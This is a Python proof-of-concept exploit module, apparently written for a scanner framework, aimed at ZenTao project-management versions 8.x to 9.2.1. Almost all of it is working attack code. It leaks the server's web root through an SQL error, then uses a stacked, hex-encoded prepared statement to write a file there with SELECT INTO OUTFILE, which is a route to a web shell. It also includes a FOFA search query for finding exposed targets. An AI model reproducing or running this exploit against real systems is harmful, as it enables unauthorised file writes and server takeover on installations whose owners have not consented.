# coding:utf-8  
import requests
from lib.core.common import url_handle,get_random_ua
from lib.core.poc import POCBase
# ...
import urllib3
import json
import base64
import binascii
urllib3.disable_warnings()

class POC(POCBase):

    _info = {
        "author" : "jijue",                      # POC作者
        "version" : "1",                    # POC版本，默认是1  
        "CreateDate" : "2021-06-09",        # POC创建时间
        "UpdateDate" : "2021-06-09",        # POC创建时间
        "PocDesc" : """
        略  
        """,                                # POC描述，写更新描述，没有就不写

        "name" : "禅道8.2-9.2.1注入GetShell",                        # 漏洞名称
        "VulnID" : "oFx-2021-0001",                      # 漏洞编号，以CVE为主，若无CVE，使用CNVD，若无CNVD，留空即可
        "AppName" : "禅道",                     # 漏洞应用名称
        "AppVersion" : "禅道8.9-9.2.1",                  # 漏洞应用版本
        "VulnDate" : "2021-06-09",                    # 漏洞公开的时间,不知道就写今天，格式：xxxx-xx-xx
        "VulnDesc" : """
            存在sql注入，通过预编译绕过过滤策略  
        """,                                # 漏洞简要描述

        "fofa-dork":"""
            app="易企天创-禅道系统"
        """,                     # fofa搜索语句
        "example" : "",                     # 存在漏洞的演示url，写一个就可以了
        "exp_img" : "",                      # 先不管  
    }

    def _verify(self):
        """
        返回vuln

        存在漏洞：vuln = [True,html_source] # html_source就是页面源码  

        不存在漏洞：vuln = [False,""]
        """
        vuln = [False,""]
        url0 = self.target + "/index.php?mode=getconfig" # url自己按需调整
        url1 = self.target + "/index.php?m=block&f=main&mode=getblockdata&blockid=case&param=" + str(base64.b64encode("{\"orderBy\":\"order limit 1,1'\",\"num\":\"1,1\",\"type\":\"openedbyme\"}".encode("utf-8")),"utf-8")
        url2 = self.target + "/index.php?m=block&f=main&mode=getblockdata&blockid=case&param="
        url3 = self.target + "/zeOnFtaXo.php"

        headers = {"User-Agent":get_random_ua(),
                    "Connection":"close",
                    "Referer":self.target,
                    # "Content-Type": "application/x-www-form-urlencoded",
                    }
        
        try:
            """
            检测逻辑，漏洞存在则修改vuln值为True，漏洞不存在则不动
            """
            req0 = requests.get(url0,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False)
            if json.loads(req0.text)["version"] != "" and json.loads(req0.text)["requestType"] == "PATH_INFO":#req.status_code == 200 and :
                req1 = requests.get(url1,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False)
                if req1.status_code == 200 and \
                    "you have an error in your sql syntax" in req1.text.lower() and \
                        "the sql is: select" in req1.text.lower():
                    
                    web_root_path = req1.text.split("</strong> on line")[0].split("<strong>")[-1].strip().split("framework")[0].replace("\\","//") + 'www//zeOnFtaXo.php'

                    sql = binascii.b2a_hex(str.encode("select 'zeOnFtaXo' into outfile '{}'".format(web_root_path))).decode("utf-8")
                    payload = "{\"orderBy\":\"order limit 1;SET @SQL=0x%s;PREPARE pord FROM @SQL;EXECUTE pord;-- -\",\"num\":\"1,1\",\"type\":\"openedbyme\"}" % (sql)
                    payload = str(base64.b64encode(str.encode(payload)),"utf-8")
                    
                    url2 = url2 + payload
                    
                    req2 = requests.get(url2,headers = headers , proxies = self.proxy ,timeout = 20,verify = False)
                    
                    req3 = requests.get(url3,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False)
                    if req3.status_code == 200 and "zeOnFtaXo" in req3.text:#zeOnFtaXo
                        vuln = [True,req3.text]
                    # req2 = requests.get(url2,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False)
                    
            else:
                vuln = [False,req0.text]
        except Exception as e:
            raise e
        
        # 以下逻辑酌情使用
        if self._honeypot_check(vuln[1]) == True:
            vuln[0] = False
        
        return vuln

    def _attack(self):
        return self._verify()